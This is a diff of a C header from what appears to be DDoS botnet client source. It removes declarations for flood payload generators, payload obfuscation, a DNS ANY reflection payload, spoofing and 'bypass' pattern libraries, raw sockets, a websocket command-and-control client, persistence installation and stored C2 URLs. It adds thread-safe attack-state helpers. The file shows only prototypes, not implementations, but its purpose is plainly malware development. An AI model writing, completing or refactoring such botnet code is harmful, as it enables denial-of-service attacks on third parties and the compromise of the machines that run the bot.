@@ -94,93 +94,26 @@ extern volatile int g_attack_active;
 extern char g_bot_uuid[64];
 extern char g_cur_task_id[64];
 
-/* ── payload.h ─────────────────────────────────── */
-void gen_payloads(void);
-void gen_http(unsigned char *buf, int *len, const char *host);
-void gen_tls_hello(unsigned char *buf, int *len, const char *sni);
-void gen_game_pkt(unsigned char *buf, int *len);
-void encrypt_payload(unsigned char *buf, int len);
-void obfuscate_payload(unsigned char *buf, int len);
-uint32_t rand_vn_ip(void);
+/* Atomic attack-state helpers (x86/ARM memory barriers via GCC builtins) */
+static inline void request_attack_stop(void) {
+    __sync_lock_test_and_set(&g_attack_stop, 1);
+}
+static inline void clear_attack_stop(void) {
+    __sync_lock_release(&g_attack_stop);
+}
+static inline int is_attack_stop(void) {
+    return __sync_fetch_and_add(&g_attack_stop, 0);
+}
+static inline void set_attack_active(int v) {
+    if (v) __sync_lock_test_and_set(&g_attack_active, 1);
+    else __sync_lock_release(&g_attack_active);
+}
+static inline int is_attack_active(void) {
+    return __sync_fetch_and_add(&g_attack_active, 0);
+}
 
-/* Shared payload pool (defined in payload.c) */
-extern unsigned char g_payloads[MAX_PAYLOADS][MAX_PAYLOAD];
-extern int g_payload_lens[MAX_PAYLOADS];
-extern int g_total_payloads;
-extern const unsigned char DNS_ANY_PAYLOAD[];
-extern const size_t DNS_ANY_LEN;
-
-/* Bypass pattern library (ported from src-base-example) */
-typedef struct {
-    char name[64];
-    char payload[256];
-    int length;
-    int effectiveness;
-    int category; /* 0=spoofed, 1=valid/reflection, 2=other */
-} bypass_pattern_t;
-
-extern const bypass_pattern_t enhanced_bypass_patterns[];
-extern const int num_bypass_patterns;
-
-int select_optimal_bypass_pattern(int burst_count, int consecutive_failures);
-void generate_smart_bypass_payload(unsigned char *buffer, int burst_count, int consecutive_failures);
-void generate_enhanced_bypass_payload(unsigned char *buffer, int pattern_idx);
-
-/* ── cpu_gov.h ─────────────────────────────────── */
-int get_cpu_usage(void);
-void update_cpu_load(void);
-int should_pause(void);
-void cpu_monitor_start(void);
-
-/* ── sock_util.h ──────────────────────────────── */
-int create_udp_socket(void);
-int create_raw_socket(int proto);
-int create_bypass_socket(void);
-uint16_t ip_csum(void *d, size_t l);
-uint16_t tcp_csum(void *ip, void *tcp);
-
-/* ── ws_client.h ──────────────────────────────── */
-typedef struct {
-    int sockfd;
-    SSL *ssl;
-    SSL_CTX *ctx;
-    char host[256], path[256];
-    int port, use_ssl;
-    /* Single mutex: OpenSSL SSL* is not safe for concurrent read+write */
-    pthread_mutex_t io;
-    /* Leftover after HTTP 101 (WS frames piggybacked on same TLS record) */
-    unsigned char rbuf[8192];
-    int rbuf_len;
-    int rbuf_off;
-} WS;
-
-int ws_connect(WS *ws, const char *bot_id);
-void ws_disconnect(WS *ws);
-int ws_send(WS *ws, const char *msg);
-/* returns: >0 payload len, 0 timeout/idle (still connected), -1 hard error/close */
-int ws_recv(WS *ws, char *buf, int cap);
-
-/* ── attack.h ─────────────────────────────────── */
-void *bg_attack_thread(void *arg);
-
-/* ── sysinfo.h ────────────────────────────────── */
-void sys_info(SysInfo *info);
-void gen_uuid_v4(char *out, int cap);
-void get_bot_uuid(char *out, int cap);
-
-/* ── json.h ───────────────────────────────────── */
-int json_int(const char *msg, const char *key);
-void json_str(const char *msg, const char *key, char *out, int cap);
-
-/* ── daemon.h ─────────────────────────────────── */
-void install_persistence(const char *path);
-void check_updates(const char *ver);
-void save_c2_url(const char *url);
-int load_c2_url(char *out, int cap);
-
-/* ── Inline helpers ────────────────────────────── */
-static inline void pkt_sent(int bytes)
-{
+/* Inline helpers for atomic counters (thread-safe without mutex) */
+static inline void pkt_sent(int bytes) {
     __sync_fetch_and_add(&g_pkt_count, 1ULL);
     __sync_fetch_and_add(&g_byte_count, (unsigned long long)(bytes > 0 ? bytes : 1));
 }
